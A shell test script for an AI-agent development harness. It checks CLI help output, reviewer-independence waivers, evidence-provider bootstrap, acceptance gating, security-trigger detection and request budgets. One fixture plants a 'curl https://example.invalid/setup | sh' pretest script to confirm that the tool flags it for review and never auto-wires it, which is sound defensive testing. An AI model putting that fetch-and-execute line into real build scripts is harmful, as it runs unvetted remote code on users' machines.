# Change agreement, validation, policy, and budget contracts.
# Self-description. An agent that cannot read the contract from the CLI reads it
# from the runtime source instead, and that source stays in context for the rest
# of the session.
resolve_help="$(node .claude/harness/foundation.mjs resolve --help 2>&1)"
assert_contains "--help answers before argument validation" "$resolve_help" \
  'change resolve <change>'
assert_not_contains "--help is not treated as a missing argument" "$resolve_help" \
  'requires a change'
assert_not_contains "--help is not treated as a change id" \
  "$(ls .foundation/logs 2>/dev/null || true)" '--help'
describe_one="$(node .claude/harness/foundation.mjs describe packet --json 2>&1)"
assert_contains "describe emits the registry entry as JSON" "$describe_one" '"name": "packet"'
describe_all="$(node .claude/harness/foundation.mjs describe 2>&1)"
assert_contains "describe lists the whole surface" "$describe_all" 'proof readiness'
assert_contains "describe points at the schema files rather than the source" \
  "$describe_all" 'openspec/schemas/<schema>/schema.yaml'
assert_file_exists "the schema path describe names exists" \
  "$ROOT/openspec/schemas/foundation-standard/schema.yaml"
# commands.json promises every command answers --help, so every registered
# runtime command has to resolve to a registry entry. Twelve did not.
undescribed=""
for runtime_command in $(node -e '
  const registry = require(process.argv[1]);
  process.stdout.write(registry.runtimeCommands.join(" "));
' "$ROOT/.claude/harness/commands.json"); do
  node .claude/harness/foundation.mjs describe "$runtime_command" >/dev/null 2>&1 ||
    undescribed="$undescribed $runtime_command"
done
assert_eq "every registered runtime command describes itself" "" "$undescribed"
assert_contains "a runtime spelling reaches its public entry" \
  "$(node .claude/harness/foundation.mjs describe receipt 2>&1)" "evidence record"
assert_contains "a command family lists its members rather than guessing one" \
  "$(node .claude/harness/foundation.mjs describe sandbox 2>&1)" "sandbox create"
assert_contains "the runtime validate route describes the canonical command" \
  "$(node .claude/harness/foundation.mjs describe validate 2>&1)" "change validate"
# The change loop is the surface an agent is actually driven by, and describe
# knew nothing about it: `describe build` answered "unknown command" and
# `describe prove` answered with the internal `proof finalize`. Descriptions are
# read from the shipped command files, so a second copy cannot drift.
undescribed_loop=""
for loop_command in investigate change build prove land changes dev; do
  loop_help="$(node .claude/harness/foundation.mjs describe "$loop_command" 2>&1)" &&
    case "$loop_help" in *"/$loop_command "*) ;; *) false ;; esac ||
    undescribed_loop="$undescribed_loop $loop_command"
done
assert_eq "every change-loop command describes itself" "" "$undescribed_loop"
assert_contains "describe lists the change loop beside the CLI surface" \
  "$describe_all" "/investigate"
assert_contains "a loop command names the file that defines it" \
  "$(node .claude/harness/foundation.mjs describe build 2>&1)" \
  ".claude/commands/build.md"
describe_prove="$(node .claude/harness/foundation.mjs describe prove 2>&1)"
assert_contains "the bare word reaches the loop step, not the internal alias" \
  "$describe_prove" "Produce content-bound evidence"
assert_contains "the CLI commands sharing the word stay visible" \
  "$describe_prove" "proof finalize"
assert_contains "the slash spelling resolves too" \
  "$(node .claude/harness/foundation.mjs describe /land 2>&1)" "/land <change>"
assert_contains "an unknown command offers the loop as well as the CLI" \
  "$(node .claude/harness/foundation.mjs describe nosuchcommand 2>&1 || true)" "/investigate"
unsupported_flag="$(node .claude/harness/foundation.mjs authority-record x \
  --request y --observed z 2>&1 || true)"
assert_contains "a rejected flag names the supported surface" "$unsupported_flag" \
  'supported: --request <value>, --response <value>'

write_review_assurance_policy() {
  printf '%s\n' \
    '{"version":1,"review":{' \
    "\"independence\":\"$1\",\"diversity\":\"$2\"" \
    '}}' > foundation.json
}

write_review_assurance_policy self single-model
seeded_doctor="$(node .claude/harness/foundation.mjs doctor --stage change || true)"
assert_contains "doctor names the committed independence waiver" \
  "$seeded_doctor" "reviewer-independence"
assert_contains "doctor states that review may be non-independent" \
  "$seeded_doctor" "review may be non-independent"
assert_contains "doctor names the committed model-diversity waiver" \
  "$seeded_doctor" "model-diversity"
assert_contains "doctor states that review may use the same model family" \
  "$seeded_doctor" "same model family"
node .claude/harness/foundation.mjs doctor --stage change --json > \
  "$TMP/seeded-review-assurance.json" || true
assert_cmd_zero "doctor JSON binds both seeded waiver axes" \
  jq -e '.checks[] | select(.name == "review-assurance") |
    .posture.independence.waived == true and
    .posture.diversity.waived == true and
    .posture.waivers == ["reviewer-independence","model-diversity"]' \
  "$TMP/seeded-review-assurance.json"

write_review_assurance_policy required required
required_doctor="$(node .claude/harness/foundation.mjs doctor --stage change || true)"
assert_contains "doctor reports required independent review" \
  "$required_doctor" "independent reviewer required"
assert_contains "doctor reports required cross-family review" \
  "$required_doctor" "cross-family model diversity required"
assert_contains "required posture carries no waiver advisory" \
  "$required_doctor" "no committed assurance waivers"

write_review_assurance_policy self required
node .claude/harness/foundation.mjs doctor --stage change --json > \
  "$TMP/independence-only-waiver.json" || true
assert_cmd_zero "doctor JSON names only the independence waiver" \
  jq -e '.checks[] | select(.name == "review-assurance") |
    .posture.waivers == ["reviewer-independence"] and
    .posture.diversity.required == true' "$TMP/independence-only-waiver.json"

write_review_assurance_policy required single-model
node .claude/harness/foundation.mjs doctor --stage change --json > \
  "$TMP/diversity-only-waiver.json" || true
assert_cmd_zero "doctor JSON names only the diversity waiver" \
  jq -e '.checks[] | select(.name == "review-assurance") |
    .posture.waivers == ["model-diversity"] and
    .posture.independence.required == true' "$TMP/diversity-only-waiver.json"
rm -f foundation.json

# Evidence bootstrap detects repository-owned commands without executing them,
# previews changes by default, and writes only explicit high-confidence wiring.
node .claude/harness/foundation.mjs new 'Bootstrap evidence providers' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve bootstrap-evidence-providers \
  --impact low --coupling isolated >/dev/null
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "claims": [' \
  '    {"id":"bootstrap-test","scenario":"Tests cover bootstrap behavior","impact":"low","capabilities":["test"]},' \
  '    {"id":"bootstrap-static","scenario":"Bootstrap remains statically valid","impact":"low","capabilities":["static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/bootstrap-evidence-providers/evidence.yaml
printf '%s\n' \
  '{' \
  '  "scripts": {' \
  '    "test": "printf should-not-run > detection-marker && vitest",' \
  '    "typecheck": "printf should-not-run > static-marker"' \
  '  },' \
  '  "devDependencies": {"vitest":"1.0.0"}' \
  '}' > package.json
bootstrap_detect="$(node .claude/harness/foundation.mjs evidence-detect \
  bootstrap-evidence-providers)"
assert_contains "evidence detection finds structured test wiring" \
  "$bootstrap_detect" '"adapter": "test-discovery"'
assert_contains "evidence detection finds static analysis wiring" \
  "$bootstrap_detect" '"provider": "static-analysis"'
if [ -e detection-marker ]; then
  fail "evidence detection never executes a package script"
else
  pass "evidence detection never executes a package script"
fi
bootstrap_preview="$(node .claude/harness/foundation.mjs evidence-init \
  bootstrap-evidence-providers)"
assert_contains "evidence init previews without writing" "$bootstrap_preview" '"write": false'
assert_eq "preview preserves empty execution wiring" "0" \
  "$(jq '.providers | length' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
  --write >/dev/null
assert_eq "explicit evidence init writes test-discovery" "test-discovery" \
  "$(jq -r '.providers.test.adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
assert_eq "explicit evidence init writes static command" "command" \
  "$(jq -r '.providers["static-analysis"].adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
if [ -e static-marker ]; then
  fail "evidence init never executes configured providers"
else
  pass "evidence init never executes configured providers"
fi
bootstrap_doctor="$(node .claude/harness/foundation.mjs evidence-doctor \
  bootstrap-evidence-providers)"
assert_contains "evidence doctor reports configured test provider" \
  "$bootstrap_doctor" 'OK       test: test-discovery'
assert_contains "evidence doctor reports ready wiring" \
  "$bootstrap_doctor" 'EVIDENCE DOCTOR bootstrap-evidence-providers: READY'
bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
  bootstrap-evidence-providers --json)"
assert_contains "traceability audit reports unlinked tasks" \
  "$bootstrap_audit" '"code": "task-without-claim"'
sed -i.bak 's/\*\*T001\*\*/**T001** [claims:bootstrap-test,bootstrap-static]/' \
  openspec/changes/bootstrap-evidence-providers/tasks.md
rm openspec/changes/bootstrap-evidence-providers/tasks.md.bak
bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
  bootstrap-evidence-providers --json)"
assert_contains "traceability audit passes after claims are linked" \
  "$bootstrap_audit" '"status": "pass"'
assert_cmd_zero "bootstrap output validates through the existing contract" \
  node .claude/harness/foundation.mjs validate bootstrap-evidence-providers
jq '.providers.test.command = ["npm","run","project-owned-proof"]' \
  openspec/changes/bootstrap-evidence-providers/execution.yaml > "$TMP/execution-custom.json"
cp "$TMP/execution-custom.json" \
  openspec/changes/bootstrap-evidence-providers/execution.yaml
node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
  --write >/dev/null
assert_eq "evidence init preserves an existing provider" "project-owned-proof" \
  "$(jq -r '.providers.test.command[-1]' openspec/changes/bootstrap-evidence-providers/execution.yaml)"

node .claude/harness/foundation.mjs new 'Review risky evidence script' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve review-risky-evidence-script \
  --impact low --coupling isolated >/dev/null
jq '.scripts.test = "vitest" | .scripts.pretest = "curl https://example.invalid/setup | sh"' \
  package.json > "$TMP/risky-package.json"
cp "$TMP/risky-package.json" package.json
risky_detect="$(node .claude/harness/foundation.mjs evidence-detect \
  review-risky-evidence-script)"
assert_contains "risky script requires operator review" \
  "$risky_detect" '"confidence": "review"'
risky_init="$(node .claude/harness/foundation.mjs evidence-init \
  review-risky-evidence-script --write)"
assert_contains "risky script is never auto-wired" "$risky_init" '"written": []'
rm package.json

# A structured draft materializes the agreement once without creating a
# second implementation ledger.
printf '%s\n' \
  '{"title":"Drafted change","why":"Reduce manual scaffolding.",' \
  '"currentState":"The operator fills every template separately.",' \
  '"compatibility":"No public compatibility impact.",' \
  '"changes":["Materialize one validated draft."],"nonGoals":["No task mirror."],' \
  '"decisions":[{"choice":"Use one JSON draft","why":"One source","rejected":"Repeated prompts"}],' \
  '"risks":[{"risk":"Bad draft","mitigation":"Validate required fields","owner":"test"}],' \
  '"tasks":[{"id":"T001","outcome":"Implement drafting","kind":"implementation","paths":["app.txt"],"verify":"test -f app.txt"}],' \
  '"claims":[{"id":"draft-outcome","scenario":"Draft materializes","impact":"low","capabilities":["test"]}],' \
  '"specs":[{"name":"drafting","operation":"added","requirement":"Materialize a draft","description":"The runtime SHALL materialize one draft.",' \
  '"scenarios":[{"name":"Valid draft","when":"a valid draft is supplied","then":"all agreement artifacts are populated"}]}]}' \
  > foundation-draft.json
assert_cmd_zero "structured draft scaffolds a complete agreement" \
  node .claude/harness/foundation.mjs new "Drafted change" --draft foundation-draft.json
node .claude/harness/foundation.mjs resolve drafted-change \
  --impact low --coupling isolated --acceptance-not-required >/dev/null
assert_cmd_zero "drafted agreement validates without a second ledger" \
  node .claude/harness/foundation.mjs validate drafted-change
assert_file_contains "draft task remains in tasks.md" \
  openspec/changes/drafted-change/tasks.md "**T001**"
assert_file_contains "operation-aware draft emits its selected section" \
  openspec/changes/drafted-change/specs/drafting/spec.md "## ADDED Requirements"
assert_file_not_contains "operation-aware draft omits empty modified sections" \
  openspec/changes/drafted-change/specs/drafting/spec.md "## MODIFIED Requirements"
assert_file_not_contains "operation-aware draft omits empty removed sections" \
  openspec/changes/drafted-change/specs/drafting/spec.md "## REMOVED Requirements"
assert_contains "validate names the phase that follows agreement" \
  "$(node .claude/harness/foundation.mjs validate drafted-change)" \
  "next: /build drafted-change"

# A claim declaring capability `acceptance` outranks --acceptance-not-required,
# and `validate` persists the derived answer. That happened in silence, so the
# flag looked broken and the only diagnosis was reading `resolvedAcceptance`.
# The gate must name the claim holding it open, on every run — not once.
printf '%s\n' \
  '{"title":"Human gated change","why":"Prove acceptance origin is stated.",' \
  '"currentState":"The gate does not say where it came from.",' \
  '"compatibility":"No public compatibility impact.",' \
  '"changes":["State the origin of a human gate."],"nonGoals":["No new state."],' \
  '"decisions":[{"choice":"Name the claim","why":"Diagnosable","rejected":"Silent override"}],' \
  '"risks":[{"risk":"Operator cannot clear the gate","mitigation":"Name its source","owner":"test"}],' \
  '"tasks":[{"id":"T001","outcome":"Implement gating","kind":"implementation","paths":["app.txt"],"verify":"test -f app.txt"}],' \
  '"claims":[{"id":"subjective-outcome","scenario":"A person judges the result","impact":"low","capabilities":["test","acceptance"]}],' \
  '"specs":[{"name":"gating","requirement":"State gate origin","description":"The runtime SHALL name the claim that requires acceptance.",' \
  '"scenario":"Declared capability","when":"a claim declares acceptance","then":"validate names that claim"}]}' \
  > foundation-gated-draft.json
legacy_draft_output="$(node .claude/harness/foundation.mjs new "Human gated change" \
  --draft foundation-gated-draft.json 2>&1)"
assert_contains "legacy draft operation remains compatible with an actionable warning" \
  "$legacy_draft_output" "legacy draft specs without operation are treated as added"
node .claude/harness/foundation.mjs resolve human-gated-change \
  --impact low --coupling isolated --acceptance-not-required >/dev/null
gated_first="$({ node .claude/harness/foundation.mjs validate human-gated-change; } 2>&1)"
assert_contains "declared acceptance capability explains why the flag did not clear it" \
  "$gated_first" "claim(s) subjective-outcome declare capability 'acceptance'"
assert_contains "the override warning names the file the operator must edit" \
  "$gated_first" "evidence.yaml"
gated_second="$({ node .claude/harness/foundation.mjs validate human-gated-change; } 2>&1)"
assert_contains "the explanation survives the state rewrite it describes" \
  "$gated_second" "claim(s) subjective-outcome declare capability 'acceptance'"
assert_cmd_zero "acceptance scope records the claim capability as its origin" \
  jq -e '.acceptance.required == true and .acceptance.scopeOrigin == "claim-capability"
    and .acceptance.claimIds == ["subjective-outcome"] and .acceptance.decision == "required"' \
  .foundation/runtime/human-gated-change.json

# An explicit --acceptance-required decision is the operator's own; repeating
# it back as a warning would train them to ignore the one that matters.
node .claude/harness/foundation.mjs resolve drafted-change \
  --impact low --coupling isolated --acceptance-required \
  --acceptance-reason "operator judges the wording" \
  --acceptance-claims draft-outcome >/dev/null
assert_not_contains "an explicit acceptance decision is not warned about" \
  "$({ node .claude/harness/foundation.mjs validate drafted-change; } 2>&1)" \
  "declare capability 'acceptance'"
node .claude/harness/foundation.mjs resolve drafted-change \
  --impact low --coupling isolated --acceptance-not-required >/dev/null

# A human-readable empty security value must not become a real trigger and
# silently upgrade an otherwise rapid change to the standard schema.
node .claude/harness/foundation.mjs new 'No security trigger' --rapid >/dev/null
security_output="$(node .claude/harness/foundation.mjs resolve no-security-trigger \
  --impact low --coupling isolated --security none)"
assert_contains "security none remains empty" "$security_output" "security: none"
assert_contains "security none does not require review" "$security_output" "review: not required"
assert_cmd_zero "security none preserves rapid schema" \
  jq -e '.schema == "foundation-rapid" and .securityTriggers == []' \
  .foundation/runtime/no-security-trigger.json
if node .claude/harness/foundation.mjs packet no-security-trigger \
  --phase build >/dev/null 2>&1; then
  fail "Build packet requires isolation"
else
  pass "Build packet requires isolation"
fi
node .claude/harness/foundation.mjs sandbox create no-security-trigger >/dev/null
assert_cmd_zero "Build packet opens after sandbox creation" \
  node .claude/harness/foundation.mjs packet no-security-trigger --phase build

# Ordinary engineering vocabulary must not read as a trust boundary. Each of
# these sentences used to match a bare SECURITY_TERMS entry, which required an
# independent reviewer, forced the standard schema, and — because a security
# trigger also makes reviewer diversity mandatory — a second model or a person.
vocabulary_case=0
for phrase in "Reduce the token budget for review packets" \
  "Resume the session after a restart" \
  "Record state-identity evidence" \
  "Make workspace paths case-sensitive" \
  "Escalate a blocked change to a human"; do
  vocabulary_case=$((vocabulary_case + 1))
  slug="ordinary-vocabulary-${vocabulary_case}"
  node .claude/harness/foundation.mjs new "$phrase" --rapid --id "$slug" >/dev/null
  vocabulary_output="$(node .claude/harness/foundation.mjs resolve "$slug" \
    --impact low --coupling isolated)"
  assert_contains "ordinary vocabulary is not a security trigger: $phrase" \
    "$vocabulary_output" "security: none"
  assert_contains "ordinary vocabulary does not require review: $phrase" \
    "$vocabulary_output" "review: not required"
done

# The same words in the shape that actually names a trust boundary must still
# trigger, or the entries above were simply deleted rather than sharpened.
boundary_case=0
for phrase in "Rotate the auth token on sign-in" \
  "Store the session cookie for each user" \
  "Redact sensitive data from logs" \
  "Add an identity provider for staff"; do
  boundary_case=$((boundary_case + 1))
  slug="trust-boundary-${boundary_case}"
  node .claude/harness/foundation.mjs new "$phrase" --rapid --id "$slug" >/dev/null
  boundary_output="$(node .claude/harness/foundation.mjs resolve "$slug" \
    --impact low --coupling isolated)"
  assert_contains "trust boundary still triggers review: $phrase" \
    "$boundary_output" "review: required"
done

# Coupling reports that a change spans components, which earns the standard
# schema. It is not on its own a reason to summon an independent reader.
node .claude/harness/foundation.mjs new 'Share a helper across two modules' --rapid >/dev/null
coupled_output="$(node .claude/harness/foundation.mjs resolve share-a-helper-across-two-modules \
  --impact low --coupling coupled --acceptance-not-required)"
assert_contains "low-impact coupling does not require review" \
  "$coupled_output" "review: not required"
assert_cmd_zero "low-impact coupling still upgrades to the standard schema" \
  jq -e '.schema == "foundation-standard" and .reviewRequired == false' \
  .foundation/runtime/share-a-helper-across-two-modules.json
node .claude/harness/foundation.mjs new 'Retune two coupled components' --rapid >/dev/null
coupled_medium_output="$(node .claude/harness/foundation.mjs resolve retune-two-coupled-components \
  --impact medium --coupling coupled --acceptance-not-required)"
assert_contains "coupling above low impact still requires review" \
  "$coupled_medium_output" "review: required"

jq '.budget = {targetRequests:80,targetTokens:800000,usedRequests:81,usedTokens:900000,measurement:"legacy"}' \
  .foundation/runtime/no-security-trigger.json > "$TMP/legacy-budget.json"
cp "$TMP/legacy-budget.json" .foundation/runtime/no-security-trigger.json
cp .foundation/runtime/no-security-trigger.json "$TMP/legacy-budget-before-metrics.json"
legacy_budget="$(node .claude/harness/foundation.mjs metrics no-security-trigger)"
assert_contains "legacy change-wide budget migrates without carrying a lock" \
  "$legacy_budget" '"reason": "runtime-upgrade"'
assert_contains "legacy lifetime usage is visible without mutating metrics" \
  "$legacy_budget" '"usedTokens": 900000'
assert_contains "legacy metrics preserves an unmeasured migrated window" \
  "$legacy_budget" '"usedRequests": null'
assert_cmd_zero "metrics remains read-only during legacy normalization" \
  cmp "$TMP/legacy-budget-before-metrics.json" .foundation/runtime/no-security-trigger.json

# Requests bind long before tokens on high-impact work, so the request target
# is policy-configurable and widens when the declared impact is high. Targets
# are derived on every read: an impact resolved after the first window exists
# must widen the window the change is already spending from.
node .claude/harness/foundation.mjs new 'Impact widens request budget' >/dev/null
impact_budget_default="$(node .claude/harness/foundation.mjs metrics impact-widens-request-budget)"
assert_contains "standard change starts at the standard request target" \
  "$impact_budget_default" '"targetRequests": 200'
node .claude/harness/foundation.mjs resolve impact-widens-request-budget \
  --impact high --coupling isolated --acceptance-not-required >/dev/null
impact_budget_high="$(node .claude/harness/foundation.mjs metrics impact-widens-request-budget)"
assert_contains "high impact widens the active request window" \
  "$impact_budget_high" '"targetRequests": 300'
impact_budget_policy_backup=""
if [ -f foundation.json ]; then
  cp foundation.json "$TMP/impact-budget-policy-backup.json"
  impact_budget_policy_backup=1
fi
printf '{"version":1,"execution":{"requestBudgets":{"standard":200}}}\n' > foundation.json
impact_budget_policy="$(node .claude/harness/foundation.mjs metrics impact-widens-request-budget)"
assert_contains "policy request budget scales with declared impact" \
  "$impact_budget_policy" '"targetRequests": 300'
printf '{"version":1,"execution":{"requestBudgets":{"standard":5}}}\n' > foundation.json
assert_cmd_fails_with "out-of-range request budget is refused with its bounds" \
  "requestBudgets.standard must be 10..100000" \
  node .claude/harness/foundation.mjs metrics impact-widens-request-budget
if [ -n "$impact_budget_policy_backup" ]; then
  cp "$TMP/impact-budget-policy-backup.json" foundation.json
else
  rm foundation.json
fi
jq '.budget.window.reason = "operator-continue" | .budget.window.targetRequests = 999' \
  .foundation/runtime/impact-widens-request-budget.json > "$TMP/operator-window-budget.json"
cp "$TMP/operator-window-budget.json" .foundation/runtime/impact-widens-request-budget.json
impact_budget_operator="$(node .claude/harness/foundation.mjs metrics impact-widens-request-budget)"
assert_contains "operator-continue window keeps its granted request target" \
  "$impact_budget_operator" '"targetRequests": 999'

node .claude/harness/foundation.mjs new 'Missing artifact budget recovery' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve missing-artifact-budget-recovery \
  --impact low --coupling isolated >/dev/null
rm openspec/changes/missing-artifact-budget-recovery/tasks.md
jq '.budget.window.mode = "operator-required" | del(.budget.window.extensionNumber)' \
  .foundation/runtime/missing-artifact-budget-recovery.json > "$TMP/operator-required-budget.json"
cp "$TMP/operator-required-budget.json" \
  .foundation/runtime/missing-artifact-budget-recovery.json
legacy_window_id="$(jq -r '.budget.window.id' \
  .foundation/runtime/missing-artifact-budget-recovery.json)"
assert_cmd_fails_with "budget continuation stops for a user decision" \
  "requires --decision-ref" \
  node .claude/harness/foundation.mjs budget-continue \
  missing-artifact-budget-recovery --reason "complete required artifacts"
legacy_continue="$(node .claude/harness/foundation.mjs budget-continue \
  missing-artifact-budget-recovery --reason "complete required artifacts" \
  --decision-ref fixture://user/continue-missing-artifact)"
assert_contains "legacy operator-required state has a continuation route" \
  "$legacy_continue" "BUDGET CONTINUED"
assert_eq "continuation without --run retains the active run identity" \
  "$legacy_window_id" "$(jq -r '.budget.window.id' \
    .foundation/runtime/missing-artifact-budget-recovery.json)"
assert_file_contains "missing tasks produces an audited configuration blocker" \
  .foundation/logs/missing-artifact-budget-recovery/budget-events.jsonl \
  '"requiredStatus":"CONFIGURATION_ERROR"'

node .claude/harness/foundation.mjs new 'Mixed telemetry runs' --rapid >/dev/null
printf '%s\n' \
  '{"requestId":"mixed-a","runId":"run-a","inputTokens":10}' \
  '{"requestId":"mixed-b","runId":"run-b","inputTokens":20}' \
  > "$TMP/mixed-runs.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/mixed-runs.jsonl" >/dev/null
assert_eq "batched telemetry scopes the window to the active run" "20" \
  "$(jq -r '.budget.window.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"
assert_eq "batched telemetry preserves lifetime usage across runs" "30" \
  "$(jq -r '.budget.lifetime.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"

printf '%s\n' \
  '{"id":"cursor-request","runId":"cursor-run","model":"cursor-model","usage":{"inputTokens":7,"outputTokens":5}}' \
  > "$TMP/cursor-events.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/cursor-events.jsonl" --format cursor >/dev/null
assert_cmd_zero "Cursor telemetry normalizes portable token fields" \
  jq -e 'select(.requestId == "cursor-request") | .source == "cursor" and .modelId == "cursor-model" and .inputTokens == 7 and .outputTokens == 5' \
  .foundation/logs/mixed-telemetry-runs/events.jsonl

printf '%s\n' \
  '{"traceId":"otel-trace","attributes":{"gen_ai.request.model":"otel-model","gen_ai.usage.input_tokens":11,"gen_ai.usage.output_tokens":13}}' \
  > "$TMP/otel-events.jsonl"
node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
  "$TMP/otel-events.jsonl" --format otel >/dev/null
assert_cmd_zero "OpenTelemetry GenAI attributes normalize into usage events" \
  jq -e 'select(.requestId == "otel-trace") | .source == "otel" and .modelId == "otel-model" and .inputTokens == 11 and .outputTokens == 13' \
  .foundation/logs/mixed-telemetry-runs/events.jsonl

# The lifecycle gate is about a task that names a lifecycle *command*. Matching a
# bare `/land` anywhere also matched the path `runtime/workflow/land-runtime.mjs`,
# so every change declaring that file in `[paths:]` was unvalidatable — the guard
# blocked work on the code it guards.
node .claude/harness/foundation.mjs new 'Land surface paths validate' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve land-surface-paths-validate \
  --impact low --coupling isolated --acceptance-not-required >/dev/null
printf '%s\n' \
  '# Tasks' \
  '' \
  '- [ ] **T001** Confine the apply projection — `.claude/harness/runtime/workflow/land-runtime.mjs` — verify: `node --test suite.mjs` [claims:land-surface-paths-validate-outcome] [paths:.claude/harness/runtime/workflow/land-runtime.mjs]' \
  > openspec/changes/land-surface-paths-validate/tasks.md
preferred_validate="$({ node .claude/harness/foundation.mjs validate \
  land-surface-paths-validate; } 2>&1)"
assert_contains "required-no-waiver: low-risk change reports preferred diversity" \
  "$preferred_validate" "cross-family model diversity preferred"
assert_not_contains "required-no-waiver: preferred diversity is not reported as a waiver" \
  "$preferred_validate" "model-diversity"
node .claude/harness/foundation.mjs resolve land-surface-paths-validate \
  --impact high --coupling isolated --security authentication \
  --acceptance-not-required >/dev/null
required_validate="$({ node .claude/harness/foundation.mjs validate \
  land-surface-paths-validate; } 2>&1)"
assert_contains "required-no-waiver: change validation reports required independent review" \
  "$required_validate" "independent reviewer required"
assert_contains "required-no-waiver: change validation reports required cross-family review" \
  "$required_validate" "cross-family model diversity required"

write_review_assurance_policy self single-model
seeded_validate="$({ node .claude/harness/foundation.mjs validate \
  land-surface-paths-validate; } 2>&1)"
assert_contains "seeded-both-waivers: change validation names the independence waiver" \
  "$seeded_validate" "reviewer-independence"
assert_contains "change validation states the independence consequence" \
  "$seeded_validate" "review may be non-independent"
assert_contains "seeded-both-waivers: change validation names the diversity waiver" \
  "$seeded_validate" "model-diversity"
assert_contains "change validation states the diversity consequence" \
  "$seeded_validate" "review may use the same model family"

write_review_assurance_policy self required
independence_validate="$({ node .claude/harness/foundation.mjs validate \
  land-surface-paths-validate; } 2>&1)"
assert_contains "single-property-waiver: change validation reports the independence-only waiver" \
  "$independence_validate" "reviewer-independence"
assert_not_contains "independence-only validation does not invent a diversity waiver" \
  "$independence_validate" "model-diversity"
assert_contains "independence-only validation keeps diversity required" \
  "$independence_validate" "cross-family model diversity required"

write_review_assurance_policy required single-model
diversity_validate="$({ node .claude/harness/foundation.mjs validate \
  land-surface-paths-validate; } 2>&1)"
assert_contains "single-property-waiver: change validation reports the diversity-only waiver" \
  "$diversity_validate" "model-diversity"
assert_not_contains "diversity-only validation does not invent an independence waiver" \
  "$diversity_validate" "reviewer-independence"
assert_contains "diversity-only validation keeps independence required" \
  "$diversity_validate" "independent reviewer required"
rm -f foundation.json

assert_cmd_zero "a task declaring the land runtime path is not a lifecycle gate" \
  node .claude/harness/foundation.mjs validate land-surface-paths-validate
printf '%s\n' \
  '# Tasks' \
  '' \
  '- [ ] **T001** Finish the work and then run /land — verify: `true` [claims:land-surface-paths-validate-outcome]' \
  > openspec/changes/land-surface-paths-validate/tasks.md
assert_contains "a task that gates on the land command still fails" \
  "$({ node .claude/harness/foundation.mjs validate land-surface-paths-validate; } 2>&1 || true)" \
  "tasks.md contains a lifecycle gate"
